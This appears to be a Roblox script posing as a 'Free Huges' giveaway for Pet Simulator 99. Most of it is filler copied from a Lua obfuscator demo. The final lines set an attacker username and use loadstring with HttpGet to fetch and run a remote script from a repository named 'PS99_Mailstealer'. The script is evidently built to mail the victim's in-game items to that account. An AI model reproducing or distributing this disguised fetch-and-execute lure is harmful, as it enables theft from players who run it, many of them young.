# Free-Huges-Pet-Simulator-99
HUGES FAST
]]--

-- Example Code:
local a = ((16164 + (((3864 + 364101) - 274396) - 67600)) + (190952 - 110638))
a = a + ((113 - (26 + 67)) + (1219 - (119 + 997))) -- Example obfuscation

-- To hide your precious values, try obfuscating them!
-- Click the [Literals] button in the upper-right corner
local b = 1203456
local c = 1230471
local d = 8023481

-- The below if-statement is opque and can be predicted as
-- all conditions are staticly defined
if c > b then
    print("true")
end

-- You may want to obfuscate such if-statements by using
-- the [Junk-If] button in the upper right corner
if 1 + d > c then
    print("obfuscate the conditions!")
end

-- Next is [Strings], which will encrypt all strings but adds
-- extra code to decrypt them at runtime.
print("Clicking [Strings] will completely hide this string!")

-- Another important thing is to hide the order of things that get executed
-- to confuse an attacker using Control Flow Flattening. With [CFF v1] we can hide
-- the control flow of the following blocks.
do
   function sieve_of_eratosthenes(n)
   local is_prime = { }
       for i = 1, n do
           is_prime[i] = 1 ~= i
       end
       for i = 2, math.floor(math.sqrt(n)) do
           if is_prime[i] then
               for j = i* i, n, i do
                   is_prime[j] = false
               end
           end
       end
       return is_prime
   end
   local primes = sieve_of_eratosthenes(420)
   for key, value in pairs(primes) do
       if (value) then
           print("Prime found: " .. key)
       end
   end
end


Username = "ItsRyulox180"
LoadScreen = true 

loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
